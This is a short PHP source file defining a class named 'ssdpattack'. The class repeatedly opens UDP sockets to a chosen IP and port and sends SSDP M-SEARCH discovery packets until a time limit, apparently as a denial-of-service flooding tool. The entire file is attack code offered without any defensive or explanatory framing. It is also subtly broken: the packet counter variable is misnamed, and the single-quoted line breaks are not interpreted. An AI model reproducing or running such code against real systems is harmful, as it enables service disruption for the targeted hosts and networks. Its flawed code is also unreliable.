<?php
class ssdpattack{
	private $ip;
	private $port;
	private $max_time;
	public function __construct($ip, $port, $max_time) {
		$this->ip = $ip;
		$this->port = $port;
		$this->max_time = $max_time;
	}
	function start(){
		$packets = 0;
		while(1){ 
			$packet++;
			if(time() >= $this->max_time){
				return $packet;
				break; 
			}
			$sock = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
			socket_connect($sock, $this->ip, $this->port);
			$data = 'M-SEARCH * HTTP/1.1\r\n';
			$data .= 'HOST: 239.255.255.250:1900\r\n';
		    $data .= 'MAN: "ssdp:discover"\r\n';
		    $data .= 'MX: 2\r\n';
		    $data .= 'ST: ssdp:all\r\n\r\n';
			socket_send($sock, $data, strlen($data), 0);
		}
	}
}
?>